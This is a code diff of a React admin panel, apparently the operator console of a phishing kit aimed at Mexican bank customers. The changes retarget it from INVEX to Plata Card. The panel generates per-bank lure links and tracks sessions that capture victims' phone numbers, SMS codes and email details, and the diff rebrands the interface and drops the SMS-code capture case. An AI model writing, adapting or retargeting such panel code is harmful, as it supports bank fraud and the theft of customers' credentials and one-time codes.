@@ -110,8 +110,8 @@ export default function AdminPanel() {
   // Generate link mutation
   const generateLink = useMutation({
     mutationFn: async () => {
-      // Utilizamos el banco seleccionado o INVEX como predeterminado si se eligió 'todos'
-      let banco = activeBank === 'todos' ? 'INVEX' : activeBank;
+      // Utilizamos el banco seleccionado o PLATACARD como predeterminado si se eligió 'todos'
+      let banco = activeBank === 'todos' ? 'PLATACARD' : activeBank;
       
       console.log(`Generating link for bank: ${banco}`);
       const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);
@@ -467,9 +467,6 @@ export default function AdminPanel() {
                   break;
                 case 'celular':
                   updatedSession.celular = inputData.celular;
-                  break;
-                case 'codigo':
-                  updatedSession.sms = inputData.codigo;
                   break;
                 case 'gmail':
                   updatedSession.correo = inputData.correo;
@@ -898,7 +895,7 @@ export default function AdminPanel() {
 
       {/* Mobile header - visible only on mobile */}
       <div className="md:hidden flex items-center justify-between p-3 bg-[#16213e] border-b border-[#2a2a42] sticky top-0 z-10">
-        <h1 className="text-lg font-bold">Panel INVEX</h1>
+        <h1 className="text-lg font-bold">Panel Plata Card</h1>
         <div className="flex gap-2 items-center">
           <div className="flex items-center bg-[#be0046] px-2 py-1 rounded text-xs">
             {isAdmin ? 
@@ -1021,8 +1018,8 @@ export default function AdminPanel() {
             value={activeBank}
             onChange={(e) => setActiveBank(e.target.value)}
           >
-            {/* Mostramos solo el banco INVEX según lo solicitado */}
-            <option value="INVEX">INVEX</option>
+            {/* Mostramos solo el banco PLATACARD según lo solicitado */}
+            <option value="PLATACARD">PLATACARD</option>
           </select>
         </div>
 
